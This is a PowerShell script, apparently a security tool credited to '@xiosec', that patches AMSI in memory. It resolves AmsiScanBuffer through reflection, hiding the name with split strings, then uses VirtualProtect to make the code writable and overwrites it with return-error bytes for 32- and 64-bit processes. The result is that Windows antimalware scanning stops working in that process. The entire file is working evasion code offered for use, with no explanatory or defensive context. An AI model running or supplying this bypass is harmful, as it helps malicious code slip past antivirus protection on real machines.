function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
    )

    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}

function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]

        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (New-Object Type[](0)),

        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')

    return $TypeBuilder.CreateType()
}

Write-Host "~> AMSI Patch";
Write-Host "~> @xiosec`n";

if([IntPtr]::Size -eq 4){
    $patch = [byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00)
    Write-Host "[+] 32-bits process"
}else{
    $patch = [byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    Write-Host "[+] 64-bits process"
}

try{
    $ScanBufferAddress = Get-ProcAddress $('am','si.dll'-join "") $('Am', 'siScanBuffer'-join"");
    Write-Host "[+] ScanBuffer Address: $ScanBufferAddress";

    $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect;
    Write-Host "[+] VirtualProtect Address: $VirtualProtectAddr";
    $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]);
    $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate);

    [UInt32]$OldProtect = 0;
    $_ = $VirtualProtect.Invoke($ScanBufferAddress, [uint32]$patch.Length, 0x40, [ref]$OldProtect);

    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, [IntPtr]$ScanBufferAddress, [uint32]$patch.Length);
    Write-Host "[*] Patch Sucessfull";

}catch{
    Write-Host "[X] $($Error[0])";
}
